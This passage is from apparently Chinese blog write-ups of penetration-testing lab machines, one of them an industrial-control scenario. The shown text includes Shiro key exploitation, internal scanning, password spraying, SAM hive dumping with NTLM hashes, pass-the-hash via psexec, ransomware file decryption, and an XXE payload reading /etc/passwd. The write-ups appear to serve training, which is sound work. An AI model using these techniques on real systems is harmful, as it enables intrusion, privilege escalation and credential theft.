sect113r2, sect131r1, sect131r2, sect163k1, sect163r1, sect163r2, sect193r1, sect193r2, sect233k1, sect233r1, sect239k1, sect283k1, sect283r1, sect409k1, sect409r1, sect571k1, sect571r1, X9.62 c2tnb191v1, X9.62 c2tnb191v2, X9.62 c2tnb191v3, X9.62 c2tnb239v1, X9.62 c2tnb239v2, X9.62 c2tnb239v3, X9.62 c2tnb359v1, X9.62 c2tnb431r1, X9.62 prime192v2, X9.62 prime192v3, X9.62 prime239v1, X9.62 prime239v2, X9.62 prime239v3, brainpoolP256r1, brainpoolP320r1, brainpoolP384r1, brainpoolP512r1crypto.policy = unlimitedjceks.key.serialFilter = java.lang.Enum;java.security.KeyRep;java.security.KeyRep$Type;javax.crypto.spec.SecretKeySpec;!*sun.arch.data.model = 64login.configuration.provider = sun.security.provider.ConfigFilecatalina.useNaming = falseuser.timezone =security.overridePropertiesFile = truejava.vm.specification.version = 1.8os.name = Linuxuser.country = USsecurity.provider.7 = com.sun.security.sasl.Providersun.boot.library.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64sun.java.command = /opt/ThermalSecurity/Thermal-Security-0.0.1-SNAPSHOT.jarsecurity.provider.9 = sun.security.smartcardio.SunPCSCjdk.security.caDistrustPolicies = SYMANTEC_TLSsun.cpu.endian = littleuser.home = /rootuser.language = enjava.specification.vendor = Oracle Corporationen = UTF-8security.provider.1 = sun.security.provider.Sunsecurity.provider.2 = sun.security.rsa.SunRsaSignsecurity.provider.3 = sun.security.ec.SunECnetworkaddress.cache.negative.ttl = 10jdk.tls.alpnCharset = ISO_8859_1security.provider.4 = com.sun.net.ssl.internal.ssl.Providersecurity.provider.5 = com.sun.crypto.provider.SunJCEsecurity.provider.6 = sun.security.jgss.SunProviderssl.KeyManagerFactory.algorithm = SunX509file.separator = /java.specification.name = Java Platform API Specificationjava.vm.specification.vendor = Oracle CorporationFILE_LOG_CHARSET = UTF-8.level = INFOjava.awt.graphicsenv = sun.awt.X11GraphicsEnvironmentja = UTF-8java.awt.headless = truecom.xyz.foo.level = SEVEREpackage.definition = sun.,com.sun.xml.internal.,com.sun.imageio.,com.sun.istack.internal.,com.sun.jmx.,com.sun.media.sound.,com.sun.naming.internal.,com.sun.proxy.,com.sun.corba.se.,com.sun.org.apache.bcel.internal.,com.sun.org.apache.regexp.internal.,com.sun.org.apache.xerces.internal.,com.sun.org.apache.xpath.internal.,com.sun.org.apache.xalan.internal.extensions.,com.sun.org.apache.xalan.internal.lib.,com.sun.org.apache.xalan.internal.res.,com.sun.org.apache.xalan.internal.templates.,com.sun.org.apache.xalan.internal.utils.,com.sun.org.apache.xalan.internal.xslt.,com.sun.org.apache.xalan.internal.xsltc.cmdline.,com.sun.org.apache.xalan.internal.xsltc.compiler.,com.sun.org.apache.xalan.internal.xsltc.trax.,com.sun.org.apache.xalan.internal.xsltc.util.,com.sun.org.apache.xml.internal.res.,com.sun.org.apache.xml.internal.resolver.helpers.,com.sun.org.apache.xml.internal.resolver.readers.,com.sun.org.apache.xml.internal.security.,com.sun.org.apache.xml.internal.serializer.utils.,com.sun.org.apache.xml.internal.utils.,com.sun.org.glassfish.,com.oracle.xmlns.internal.,com.oracle.webservices.internal.,oracle.jrockit.jfr.,org.jcp.xml.dsig.internal.,jdk.internal.,jdk.nashorn.internal.,jdk.nashorn.tools.,jdk.xml.internal.,com.sun.activation.registries.,jdk.jfr.events.,jdk.jfr.internal.,jdk.management.jfr.internal.sun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classesjava.protocol.handler.pkgs = org.springframework.boot.loadersun.management.compiler = HotSpot 64-Bit Tiered Compilersjava.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08policy.provider = sun.security.provider.PolicyFileuser.name = rootpolicy.url.1 = file:$&#123;java.home&#125;/lib/security/java.policypath.separator = :fr = UTF-8securerandom.source = file:/dev/randompolicy.url.2 = file:$&#123;user.home&#125;/.java.policyjdk.tls.disabledAlgorithms = SSLv3, TLSv1, TLSv1.1, RC4, DES, MD5withRSA, DH keySize &lt; 1024, EC keySize &lt; 224, 3DES_EDE_CBC, anon, NULL, include jdk.disabled.namedCurvesos.version = 5.4.0-166-genericjava.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsedpolicy.ignoreIdentityScope = falsejava.runtime.name = OpenJDK Runtime Environmentkeystore.type.compat = truefile.encoding = UTF-8spring.beaninfo.ignore = truejava.util.logging.ConsoleHandler.formatter = java.util.logging.SimpleFormatterjava.vm.name = OpenJDK 64-Bit Server VMjdk.sasl.disabledMechanisms =java.vendor.url.bug = http://bugreport.sun.com/bugreport/java.io.tmpdir = /tmpjava.util.logging.FileHandler.formatter = java.util.logging.XMLFormatterjava.util.logging.FileHandler.count = 1catalina.home = /tmp/tomcat.8080.2227855515484347988java.version = 1.8.0_392sun.cds.enableSharedLookupCache = falsesun.security.krb5.maxReferrals = 5jdk.tls.keyLimits = AES/GCM/NoPadding KeyUpdate 2^37PID = 620java.vm.specification.name = Java Virtual Machine Specificationjava.awt.printerjob = sun.print.PSPrinterJobCONSOLE_LOG_CHARSET = UTF-8jdk.xml.dsig.secureValidationPolicy = disallowAlg http://www.w3.org/TR/1999/REC-xslt-19991116,disallowAlg http://www.w3.org/2001/04/xmldsig-more#rsa-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#hmac-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#md5,maxTransforms 5,maxReferences 30,disallowReferenceUriSchemes file http https,minKeySize RSA 1024,minKeySize DSA 1024,minKeySize EC 224,noDuplicateIds,noRetrievalMethodLoopscatalina.base = /tmp/tomcat.8080.2227855515484347988java.library.path = /usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/libjava.util.logging.FileHandler.limit = 50000java.vm.info = mixed mode, sharingjava.vendor = Private Buildkeystore.type = jksjava.specification.maintenance.version = 5handlers = java.util.logging.ConsoleHandlersun.io.unicode.encoding = UnicodeLittlejava.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/extpolicy.expandProperties = truesecurerandom.strongAlgorithms = NativePRNGBlocking:SUNkrb5.kdc.bad.policy = tryLast===========================================ProcessEnvironment-------------not found!===========================================OSS-------------not found!===========================================UserPassSearcher-------------org.apache.shiro.web.filter.authc.FormAuthenticationFilter:[failureKeyAttribute = shiroLoginFailure, loginUrl = /login, successUrl = /, usernameParam = username, passwordParam = password]org.apache.catalina.startup.Tomcat:[hostname = localhost]===========================================CookieThief-------------not found!===========================================AuthThief-------------not found!=========================================== 有用的是这里，存在一个shirokey，然后shiro一把梭，注入内存马 1234===========================================CookieRememberMeManager(ShiroKey)-------------algMode = CBC, key = QZYysgMYhG6/CzIJlVpR2g==, algName = AES flag01在根目录 FLAG02写一个公钥进去，ssh连接，上传一个fscan再做一个代理 fscan扫一下内网 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273root@security:~# ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e:2f:44:6e brd ff:ff:ff:ff:ff:ff inet 172.22.17.213/16 brd 172.22.255.255 scope global dynamic eth0 valid_lft 315359102sec preferred_lft 315359102sec inet6 fe80::216:3eff:fe2f:446e/64 scope link valid_lft forever preferred_lft foreverroot@security:~# ./fscan2 -h 172.22.17.213/24┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.0[2025-05-02 11:23:19] [INFO] 暴力破解线程数: 1[2025-05-02 11:23:19] [INFO] 开始信息扫描[2025-05-02 11:23:19] [INFO] CIDR范围: 172.22.17.0-172.22.17.255[2025-05-02 11:23:20] [INFO] 生成IP范围: 172.22.17.0.%!d(string=172.22.17.255) - %!s(MISSING).%!d(MISSING)[2025-05-02 11:23:20] [INFO] 解析CIDR 172.22.17.213/24 -&gt; IP范围 172.22.17.0-172.22.17.255[2025-05-02 11:23:20] [INFO] 最终有效主机数量: 256[2025-05-02 11:23:20] [INFO] 开始主机扫描[2025-05-02 11:23:20] [SUCCESS] 目标 172.22.17.6 存活 (ICMP)[2025-05-02 11:23:20] [SUCCESS] 目标 172.22.17.213 存活 (ICMP)[2025-05-02 11:23:23] [INFO] 存活主机数量: 2[2025-05-02 11:23:23] [INFO] 有效端口数量: 233[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:445[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:139[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:135[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:21[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:80[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.213:22[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.213:8080[2025-05-02 11:23:23] [SUCCESS] 服务识别 172.22.17.6:21 =&gt; [ftp] 产品:Microsoft ftpd 系统:Windows Banner:[220 Microsoft FTP Service.][2025-05-02 11:23:23] [SUCCESS] 服务识别 172.22.17.213:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.][2025-05-02 11:23:28] [SUCCESS] 服务识别 172.22.17.6:445 =&gt;[2025-05-02 11:23:28] [SUCCESS] 服务识别 172.22.17.6:139 =&gt; Banner:[.][2025-05-02 11:23:28] [SUCCESS] 服务识别 172.22.17.213:8080 =&gt; [http][2025-05-02 11:23:28] [SUCCESS] 服务识别 172.22.17.6:80 =&gt; [http][2025-05-02 11:24:28] [SUCCESS] 服务识别 172.22.17.6:135 =&gt;[2025-05-02 11:24:28] [INFO] 存活端口数量: 7[2025-05-02 11:24:28] [INFO] 开始漏洞扫描[2025-05-02 11:24:28] [INFO] 加载的插件: findnet, ftp, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle[2025-05-02 11:24:28] [SUCCESS] 网站标题 http://172.22.17.6 状态码:200 长度:661 标题:172.22.17.6 - /[2025-05-02 11:24:28] [SUCCESS] NetBios 172.22.17.6 WORKGROUP\\WIN-ENGINEER[2025-05-02 11:24:28] [SUCCESS] NetInfo 扫描结果目标主机: 172.22.17.6主机名: WIN-ENGINEER发现的网络接口: IPv4地址: └─ 172.22.17.6[2025-05-02 11:24:28] [SUCCESS] 网站标题 http://172.22.17.213:8080 状态码:302 长度:0 标题:无标题 重定向地址: http://172.22.17.213:8080/login;jsessionid=AE53E4C807EB6DEB9B204E7B4201FDFF[2025-05-02 11:24:28] [SUCCESS] 匿名登录成功![2025-05-02 11:24:28] [SUCCESS] 网站标题 http://172.22.17.213:8080/login;jsessionid=AE53E4C807EB6DEB9B204E7B4201FDFF 状 态码:200 长度:2936 标题:火创能源监控画面管理平台[2025-05-02 11:24:29] [SUCCESS] 目标: http://172.22.17.213:8080 漏洞类型: poc-yaml-spring-actuator-heapdump-file 漏洞名称: 详细信息: author:AgeloVito links:https://www.cnblogs.com/wyb628/p/8567610.html[2025-05-02 11:24:30] [SUCCESS] 目标: http://172.22.17.213:8080 漏洞类型: poc-yaml-springboot-env-unauth 漏洞名称: spring2 详细信息: links:https://github.com/LandGrey/SpringBootVulExploit 12345[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:445[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:139[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:135[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:21[2025-05-02 11:23:23] [SUCCESS] 端口开放 172.22.17.6:80 先看ftp，可以匿名登陆但是中文会乱码，和80端口的文件是一样的，随便在一个服务下载就行 内部通知.docx告诉我们了密码规则 12登陆账户设置： 为方便管理和标准化，登陆账户名将采用姓名全称的小写拼音形式。例如，张三的账户名为zhangsan，工号为0801。初始密码将由账户名+@+工号组成，例如，zhangsan@0801。 还存在一个通讯录，根据通讯录里的信息和这个密码规则可以构造，有好多账号都可以登陆，任意一个就可以 1chenhua/chenhua@0813 rdp连接，scad.txt还给了一个管理员的密码 123WIN-SCADA: 172.22.26.xxUsername: AdministratorPassword: IYnT3GyCiy3 但是这不是这台主机的管理员密码，题目提示 12关卡剧情：尝试接管 SCADA 工程师的个人 PC，并通过滥用 Windows 特权组提升至系统权限。 查看当前用户组 12345678910111213141516171819202122232425262728C:\\Users\\chenhua&gt;net user chenhua用户名 chenhua全名注释用户的注释国家/地区代码 000 (系统默认值)帐户启用 Yes帐户到期 从不上次设置密码 2023/12/26 0:47:03密码到期 从不密码可更改 2023/12/26 0:47:03需要密码 Yes用户可以更改密码 Yes允许的工作站 All登录脚本用户配置文件主目录上次登录 2025/5/2 11:36:30可允许的登录小时数 All本地组成员 *Backup Operators *Remote Desktop Users *Users全局组成员 *None命令成功完成。 我们在Backup Operators组内，但是没给用户分配SeBackup特权，可以用注册表 SAM 转储提权，直接转储 sam 和 system 1234PS C:\\users\\chenhua\\Desktop&gt; reg save hklm\\sam sam.hive操作成功完成。PS C:\\users\\chenhua\\Desktop&gt; reg save hklm\\system system.hive操作成功完成。 然后用secretsdump导出hash 1234567891011121314Administrator:500:aad3b435b51404eeaad3b435b51404ee:f82292b7ac79b05d5b0e3d302bd0d279:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:a2fa2853651307ab9936cc95c0e0acf5:::chentao:1000:aad3b435b51404eeaad3b435b51404ee:47466010c82da0b75328192959da3658:::zhaoli:1001:aad3b435b51404eeaad3b435b51404ee:2b83822caab67ef07b614d05fd72e215:::wangning:1002:aad3b435b51404eeaad3b435b51404ee:3c52d89c176321511ec686d6c05770e3:::zhangling:1003:aad3b435b51404eeaad3b435b51404ee:8349a4c5dd1bdcbc5a14333dd13d9f81:::zhangying:1004:aad3b435b51404eeaad3b435b51404ee:8497fa5480a163cb7817f23a8525be7d:::lilong:1005:aad3b435b51404eeaad3b435b51404ee:c3612c48cf829d1149f7a4e3ef4acb8a:::liyumei:1006:aad3b435b51404eeaad3b435b51404ee:63ddcde0fa219c75e48e2cba6ea8c471:::wangzhiqiang:1007:aad3b435b51404eeaad3b435b51404ee:5a661f54da156dc93a5b546ea143ea07:::zhouyong:1008:aad3b435b51404eeaad3b435b51404ee:5d49bf647380720b9f6a15dbc3ffe432:::chenhua:1009:aad3b435b51404eeaad3b435b51404ee:07ff24422b538b97f3c297cc8ddc7615::: 123456789101112131415161718192021222324┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:f82292b7ac79b05d5b0e3d302bd0d279 Administrator@172.22.17.6Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation[*] Requesting shares on 172.22.17.6.....[*] Found writable share ADMIN$[*] Uploading file odkqcbIH.exe[*] Opening SVCManager on 172.22.17.6.....[*] Creating service CFcL on 172.22.17.6.....[*] Starting service CFcL.....[!] Press help for extra shell commands[-] Decoding error detected, consider running chcp.com at the target,map the result with https://docs.python.org/3/library/codecs.html#standard-encodingsand then execute smbexec.py again with -codec and the corresponding codecMicrosoft Windows [�汾 10.0.20348.2113][-] Decoding error detected, consider running chcp.com at the target,map the result with https://docs.python.org/3/library/codecs.html#standard-encodingsand then execute smbexec.py again with -codec and the corresponding codec(c) Microsoft Corporation����������Ȩ����C:\\Windows\\system32&gt; type C:\\Users\\Administrator\\flag\\flag02.txt FLAG03之前给的排上用场了，用fscan扫一下 123WIN-SCADA: 172.22.26.xxUsername: AdministratorPassword: IYnT3GyCiy3 1234567891011121314151617181920212223242526272829root@security:~# ./fscan2 -h 172.22.26.1/24┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.0[2025-05-02 12:42:59] [INFO] 暴力破解线程数: 1[2025-05-02 12:42:59] [INFO] 开始信息扫描[2025-05-02 12:42:59] [INFO] CIDR范围: 172.22.26.0-172.22.26.255[2025-05-02 12:42:59] [INFO] 生成IP范围: 172.22.26.0.%!d(string=172.22.26.255) - %!s(MISSING).%!d(MISSING)[2025-05-02 12:42:59] [INFO] 解析CIDR 172.22.26.1/24 -&gt; IP范围 172.22.26.0-172.22.26.255[2025-05-02 12:42:59] [INFO] 最终有效主机数量: 256[2025-05-02 12:42:59] [INFO] 开始主机扫描[2025-05-02 12:42:59] [SUCCESS] 目标 172.22.26.11 存活 (ICMP)[2025-05-02 12:43:02] [INFO] 存活主机数量: 1[2025-05-02 12:43:02] [INFO] 有效端口数量: 233[2025-05-02 12:43:02] [SUCCESS] 端口开放 172.22.26.11:135[2025-05-02 12:43:02] [SUCCESS] 端口开放 172.22.26.11:139[2025-05-02 12:43:02] [SUCCESS] 端口开放 172.22.26.11:80[2025-05-02 12:43:02] [SUCCESS] 端口开放 172.22.26.11:1433[2025-05-02 12:43:02] [SUCCESS] 端口开放 172.22.26.11:445[2025-05-02 12:43:07] [SUCCESS] 服务识别 172.22.26.11:139 =&gt; Banner:[.][2025-05-02 12:43:07] [SUCCESS] 服务识别 172.22.26.11:1433 =&gt; [ms-sql-s] 版本:13.00.4001; SP1 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.][2025-05-02 12:43:07] [SUCCESS] 服务识别 172.22.26.11:445 =&gt;[2025-05-02 12:43:08] [SUCCESS] 服务识别 172.22.26.11:80 =&gt; [http] 远程桌面连接，登陆后会自动启动软件，然后开启锅炉得到flag FLAG04桌面上有一个解密你的文件.txt 12345678910111213141516171819202122232425** 您的文件已被加密 **很抱歉，您的计算机中的文件已被加密。要解锁您的文件，您需要支付赎金。-----------------------------------------| 注意事项 |-----------------------------------------| 1. 不要试图删除或修改加密文件。 || 2. 支付赎金前，不要尝试恢复文件。 || 3. 请在规定时间内支付赎金。 |-----------------------------------------要获取解密密钥和进一步的说明，请访问我们的支付网站：[支付网站链接]如果无法访问支付网站，请通过电子邮件联系我们：contact@ransomware.com赎金金额：2比特币-----------------------------------------| 警告：尝试恢复文件或报警将导致永久丢失文件。|-----------------------------------------比特币支付地址：1ABcDefGhijxLxnxpxrsxUvwxYZabcdEf 桌面上还给了两个.lock文件，附件还给了两个key，c盘还有一个Lockyou.exe 用dnSpy反编译可以看到加密逻辑根据 locky 勒索软件家族加解密逻辑和 .NET 逆向代码，解密思路如下： 首先用 privateKey 对加密的 encryptedAesKey进行 RSA 解密，得到 AES_KEY。 再用 AES_KEY 对加密的文件 ScadaDB.sql.locky 解密，得到 ScadaDB.sql 通过工具，将 privateKey 从 XML 格式转换为 PEM 格式，得到 PRIVATE_KEY： 通过工具，将 privateKey 从 XML 格式转换为 PEM 格式，得到 PRIVATE_KEY： 12345678910111213141516-----BEGIN PRIVATE KEY-----MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALqC9ggGlbTFae2+PyH3HsdgK7brtrb7QTtuSXTMAJ3ruoBDwq0Lw8rMHm3IQNS51d3vjiVeZB8RU6f3YiM0p5p4VJn2Y2K7IWUixptX08HEay+mGFbH1WRv+FC0g1EXwIocjdRyCz/1qgqrrtaFqNAncaMDLGaTAz6Hasx3BQsRAgMBAAECgYEAtuLJ687BJ5RYraZac6zFQo178A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDoxRqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQNUM6ss/2/CMM/EgM9vz0CQQDZE+pqh9wn+mEindAUITKLSSPQVlFCaZaaICaD8LQzJ5fbnmZ6PwiyDS/Cz080/dEsuPbk7Wlsgn5+rBZ9QSYXAkEA2/QGgIpqpxODaJLQvjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbkVfy5FwJBALpSudaOno1B/7XytvNQO04KjU75h+31K2tHRUfihwmRZmr/Xv52tEP/xYr03guiALTeXizJCsA0kdawZu1DyikCQDztieeNcCG77AjJsn0dyrUGwJlSpjx0VJBtlUVywVdMzMJHvIQgBOXUJHHLdxlvIw7CRkuK9CbDryEauYGAMh0CQCUtrbQdFiZttt6ZYSUK1qkr7PS3RHk3fHIDVqMk5DDpGCInkU0ZKP0bl7n4MaaZeGy/UUUyPHvLZB6D8zSyuGw=-----END PRIVATE KEY----- 可以解出key是： 1cli9gqXpTrm7CPMcdP9TSmVSzXVgSb3jrW+AakS7azk= 使用 AES KEY 对文件 ScadaDB.sql.locky 进行解密。RSA + AES 解密的完整脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475# -*- coding: utf-8 -*-# @Author : iker# @Time : 2024/03/04 16:10# @Function: RSA Privatekey Decryption &amp; AES CBC Decryptionimport base64from Crypto.Util.Padding import padfrom Crypto.Cipher import AESfrom Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5def rsa_decrypt(data): private_key = &quot;&quot;&quot;-----BEGIN PRIVATE KEY-----MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALqC9ggGlbTFae2+PyH3HsdgK7brtrb7QTtuSXTMAJ3ruoBDwq0Lw8rMHm3IQNS51d3vjiVeZB8RU6f3YiM0p5p4VJn2Y2K7IWUixptX08HEay+mGFbH1WRv+FC0g1EXwIocjdRyCz/1qgqrrtaFqNAncaMDLGaTAz6Hasx3BQsRAgMBAAECgYEAtuLJ687BJ5RYraZac6zFQo178A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDoxRqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQNUM6ss/2/CMM/EgM9vz0CQQDZE+pqh9wn+mEindAUITKLSSPQVlFCaZaaICaD8LQzJ5fbnmZ6PwiyDS/Cz080/dEsuPbk7Wlsgn5+rBZ9QSYXAkEA2/QGgIpqpxODaJLQvjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbkVfy5FwJBALpSudaOno1B/7XytvNQO04KjU75h+31K2tHRUfihwmRZmr/Xv52tEP/xYr03guiALTeXizJCsA0kdawZu1DyikCQDztieeNcCG77AjJsn0dyrUGwJlSpjx0VJBtlUVywVdMzMJHvIQgBOXUJHHLdxlvIw7CRkuK9CbDryEauYGAMh0CQCUtrbQdFiZttt6ZYSUK1qkr7PS3RHk3fHIDVqMk5DDpGCInkU0ZKP0bl7n4MaaZeGy/UUUyPHvLZB6D8zSyuGw=-----END PRIVATE KEY-----&quot;&quot;&quot; data = base64.b64decode(data) priobj = Cipher_pkcs1_v1_5.new(RSA.importKey(private_key)) decrypted_data = priobj.decrypt(data,None) return decrypted_datadef padding(data): # style(string) – Padding algorithm.It can be ‘pkcs7’ (default), ‘iso7816’ or ‘x923’. if len(data) % AES.block_size != 0: return pad(data, AES.block_size, &#x27;pkcs7&#x27;) else: return datadef aes_cbc_encrypt(iv, key, data): key = padding(key) data = padding(data) iv = padding(iv) aes = AES.new(key, AES.MODE_CBC, iv) cipher_data = aes.encrypt(data) return cipher_datadef aes_cbc_decrypt(iv, key, data): iv = padding(iv) key = padding(key) data = padding(data) aes = AES.new(key, AES.MODE_CBC, iv) data = aes.decrypt(data) return datadef decrypt_file(encrypted_filepath,output_filepath,key): with open(encrypted_filepath, &#x27;rb&#x27;) as f: data = f.read() iv = b&#x27;\\x00&#x27; * 16 decryption_result = aes_cbc_decrypt(iv, key, data) with open(output_filepath, &#x27;wb&#x27;) as f: f.write(decryption_result)if __name__ == &quot;__main__&quot;: encryptedAesKey = &quot;lFmBs4qEhrqJJDIZ6PXvOyckwF/sqPUXzMM/IzLM/MHu9UhAB3rW/XBBoVxRmmASQEKrmFZLxliXq789vTX5AYNFcvKlwF6+Y7vkeKMOANMczPWT8UU5UcGi6PQLsgkP3m+Q26ZD9vKRkVM5964hJLVzogAUHoyC8bUAwDoNc7g=&quot; key = rsa_decrypt(encryptedAesKey) encrypted_filepath = &quot;ScadaDB.sql.locky&quot; output_filepath = &quot;ScadaDB.sql&quot; decrypt_file(encrypted_filepath,output_filepath,key) 运行解密出ScadaDB.sql,flag4在数据库里","categories":[{"name":"春秋云镜","slug":"春秋云镜","permalink":"https://lvzhouhang.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"群友机-Bamuwe","slug":"群友靶机-Bamuwe","date":"2025-04-30T07:44:22.000Z","updated":"2025-05-05T05:06:41.167Z","comments":true,"path":"2025/04/30/群友靶机-Bamuwe/","permalink":"https://lvzhouhang.xyz/2025/04/30/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA-Bamuwe/","excerpt":"","text":"信息搜集12345678910┌──(root㉿kali)-[~/Desktop/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:38:e9:13 PCS Systemtechnik GmbH192.168.31.171 08:00:27:59:20:9a PCS Systemtechnik GmbH3 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 2.396 seconds (106.84 hosts/sec). 3 responded 123456789101112┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 192.168.31.171Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-30 03:50 EDTNmap scan report for 192.168.31.171Host is up (0.0017s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:59:20:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 6.80 seconds 80端口前端有一段注释 123456789&lt;!-- XML STRUCTURE EXAMPLE --&gt;&lt;!--&lt;user&gt; &lt;name&gt;John Doe&lt;/name&gt; &lt;tel&gt;123-4567890&lt;/tel&gt; &lt;email&gt;admin@admin.com&lt;/email&gt; &lt;password&gt;secret123&lt;/password&gt;&lt;/user&gt;--&gt; 很明显的xxe提示 123456789&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt; &lt;user&gt; &lt;name&gt;John Doe&lt;/name&gt; &lt;tel&gt;123-4567890&lt;/tel&gt; &lt;email&gt;&amp;xxe;&lt;/email&gt; &lt;password&gt;secret123&lt;/password&gt; &lt;/user&gt; 可以读取到文件，知道有一个welcome用户，可以直接读取user.txt 提权读取/home/welcome/.viminfo，他告诉你要去读取pass.txt,pass.txt里告诉了welcome的密码，ssh登录 123456welcome@Bamuwe:~$ sudo -lMatching Defaults entries for welcome on Bamuwe: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser welcome may run the following commands on Bamuwe: (ALL) NOPASSWD: /opt/sub.sh 12welcome@Bamuwe:~$ cat /opt/sub.sh/usr/bin/mosquitto_sub &quot;$@&quot; &gt; /home/welcome/sub.log mosquitto是一个消息代理软件mosquitto_sub是用来订阅的，对应的是 mosquitto_pub 参考连接 在kali上修改mosquitto的配置文件 12┌──(root㉿kali)-[~/Desktop/tmp]└─# vim /etc/mosquitto/mosquitto.conf 添加 1234listener 1883bind_address 0.0.0.0allow_anonymous truepassword_file /etc/mosquitto/pwflie.example 然后启动服务 12345678910┌──(root㉿kali)-[~/Desktop/tmp]└─# mosquitto1746003305: mosquitto version 2.0.21 starting1746003305: Using default config.1746003305: Starting in local only mode. 